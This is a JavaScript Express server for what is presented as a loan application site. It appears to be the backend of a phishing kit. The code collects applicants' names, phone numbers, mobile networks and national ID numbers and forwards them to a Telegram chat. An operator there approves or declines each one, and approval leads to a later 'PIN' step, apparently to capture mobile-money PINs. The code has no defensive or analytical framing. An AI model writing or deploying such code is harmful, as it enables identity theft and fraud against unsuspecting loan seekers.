const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// 🧠 TEMP STORAGE (in-memory)
let users = {}; // { phone: { status: "pending" } }

// Serve files
app.use(express.static(__dirname));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ✅ APPLICATION SUBMIT
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  // Save user status
  users[phone] = { status: "pending" };

  const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📱 Phone: ${phone}
📡 Network: ${network}
💰 Amount: ${amount}
🆔 ID: ${nationalId}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ APPROVE", callback_data: `approve_${phone}` },
            { text: "❌ DECLINE", callback_data: `decline_${phone}` }
          ]
        ]
      }
    });

    res.json({ success: true });

  } catch (err) {
    console.error(err.message);
    res.json({ success: true });
  }
});

// ✅ TELEGRAM WEBHOOK (BUTTON HANDLER)
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
  const query = req.body.callback_query;

  if (query) {
    const data = query.data;
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;

    let phone = data.split("_")[1];

    if (data.startsWith("approve_")) {
      users[phone].status = "approved";

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        chat_id: chatId,
        message_id: messageId,
        text: `✅ APPROVED\n📱 ${phone}\n\nStatus: Details verified\nNext: PIN`,
      });

    } else if (data.startsWith("decline_")) {
      users[phone].status = "declined";

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        chat_id: chatId,
        message_id: messageId,
        text: `❌ DECLINED\n📱 ${phone}`,
      });
    }
  }

  res.sendStatus(200);
});

// ✅ CHECK STATUS BEFORE PIN
app.post("/check-status", (req, res) => {
  const { phone } = req.body;

  const user = users[phone];

  if (!user) return res.json({ status: "pending" });

  res.json({ status: user.status });
});

// START SERVER
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running...");
});
